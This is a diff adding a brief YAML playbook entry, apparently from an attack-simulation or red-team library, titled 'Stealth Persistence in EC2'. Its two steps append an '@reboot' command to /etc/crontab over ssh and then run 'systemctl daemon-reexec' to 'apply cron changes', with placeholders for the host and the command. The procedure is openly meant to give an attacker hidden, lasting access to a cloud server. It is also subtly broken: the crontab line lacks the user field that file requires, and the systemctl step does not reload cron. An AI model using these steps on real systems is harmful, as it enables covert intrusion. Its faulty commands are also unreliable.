@@ -1,0 +1,7 @@
+description: Create a new startup script in EC2 with stealthy persistence.
+name: Stealth Persistence in EC2
+steps:
+- action: ssh ec2-user@<ip> 'echo "@reboot <cmd>" >> /etc/crontab'
+  description: Add cron job for persistence
+- action: systemctl daemon-reexec
+  description: Apply cron changes
